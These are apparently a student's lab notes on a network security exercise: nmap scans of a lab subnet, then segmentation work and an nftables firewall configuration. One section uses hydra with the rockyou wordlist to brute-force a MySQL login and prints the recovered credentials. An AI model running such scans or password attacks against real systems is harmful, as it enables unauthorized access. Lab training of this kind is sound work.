
### voor /cmd functie heb je sudo rechten

het risico dat je via die tool commandos kan ingeven is dat je u computer naar de frietjes kunt brengen.

```
nmap 172.30.0.0/16
```

Scan per host en zie
```nmap 172.30.0.0```

Scan per host en doe banner grab

```
nmap -sV 172.30.0.0
```

database met versie:

```
3306/tcp open  mysql   MySQL 5.5.5-10.11.8-MariaDB
```

### What webserver software is running on web?

httpd want men cmd werkt niet

## wachtwoord en usernme voor databse hackje

commando: ```hydra -l toor -P /usr/share/wordlists/rockyou.txt mysql://172.30.0.15```

```[3306][mysql] host: 172.30.0.15   login: toor   password: summer```

- De -sC optie in Nmap activeert de standaard scripts die zijn ontworpen om informatie over de services en kwetsbaarheden op de gescande poorten te verzamelen.

### scannen webserver

![alt text](image-1.png)

## netwerk segmentatie oplossingen

- Attack vector verwijst naar de verschillende manieren waarop een aanvaller toegang kan krijgen tot een systeem of netwerk om een aanval uit te voeren.

- Ja, er kan al netwerksegmentatie zijn gedaan op het bedrijfsnetwerk, afhankelijk van de netwerkinfrastructuur en configuratie.

- Een DMZ (Demilitarized Zone) is een beveiligde subnetwerkzone waar publieke diensten, zoals webservers en mailservers, worden geplaatst om ze te scheiden van het interne netwerk.

- Een nadeel van netwerksegmentatie kan zijn dat het de interactie tussen client en server kan bemoeilijken, wat kan leiden tot prestatieproblemen of complexe configuraties.

## segmenteren

zie netwer kschema.

aanpassen /services script:

```bash
ss -tulnp | grep ':9200'
tcp   LISTEN 0      128          0.0.0.0:9200      0.0.0.0:*    users:(("python",pid=4630,fd=6),("python",pid=4630,fd=5),("python",pid=628,fd=5))  
```

```bash
[root@web conf]# ps -p 628 -o args=
/usr/bin/python /opt/flask/app.py
```

vervolgens ip aanpassen naar nieuwe database: 172.30.1.15

## bug niet vinden cmd

`scp ./files/web/app.jar web:/home/vagrant/app.jar`
vervolgens naar `/opt/insecurewebapp/app.jar`

## isntalleren van nftables en fix opdracht

```bash
sudo apt update
sudo apt install nftables  # Voor Debian/Ubuntu

sudo nano /etc/nftables.conf
```

```bash
table inet filter {
        chain forward {
                type filter hook forward priority filter; policy drop;
                ip daddr 172.30.2.10 tcp dport { 80, 443 } accept # Allow HTTP and HTTPS to the web server
                ip saddr 172.30.0.0/16 oifname "eth1" accept # Allow traffic from the internal network to the external network
                ip saddr 172.10.10.0/24 ip daddr 172.30.0.0/16 ip protocol esp accept # Allow ESP traffic from the VPN
                udp dport 500 accept # Allow IKE traffic
                udp dport 4500 accept # Allow NAT-T traffic
                ip saddr 172.10.10.0/24 ip daddr 172.30.0.0/16 ct state { established, related } accept # Allow established and related traffic from the VPN
                ip saddr 172.10.10.0/24 ip daddr 172.30.0.0/16 tcp dport 22 accept # Allow SSH traffic from the home network
                ip saddr 172.10.10.0/24 ip daddr 172.30.0.0/16 tcp dport 2222 accept # Allow SSH traffic from the home network
                ip saddr 172.10.10.0/24 ip daddr 172.30.0.0/16 icmp type echo-request accept # Allow ICMP traffic from the VPN
                ip saddr 172.10.10.0/24 ip daddr 172.30.0.0/16 accept # Allow all other traffic from the home network
                ip saddr 172.30.0.0/16 ip daddr 172.10.10.0/24 accept # Allow all traffic to the home network
        }

        chain input {
                type filter hook input priority filter; policy drop;
                ct state established,related accept # Allow established and related traffic
                udp dport 500 accept # Allow IKE traffic
                udp dport 4500 accept # Allow NAT-T traffic
                ip protocol esp accept # Allow ESP traffic
                tcp dport 22 accept # Allow SSH traffic
                tcp dport 2222 accept # Allow SSH traffic
                icmp type echo-request accept # Allow ICMP traffic
        }
}
table ip nat {
        chain postrouting {
                type nat hook postrouting priority srcnat; policy accept;
                ip saddr 172.30.0.0/16 oifname "eth1" masquerade
                ip saddr 172.30.0.0/16 ip daddr 192.168.62.0/24 masquerade
        }
}

```

## isproute rdns doorsturen naar nieuwe ip adres

unbounc .cs ip adres van dns server geven

```
172.30.1.10
```

vervolgens

```bash
sudo nft flush ruleset
sudo nft -f /etc/nftables.conf
```

nmap vanaf de kali

```nmap -p 80,22,666 172.30.2.10```
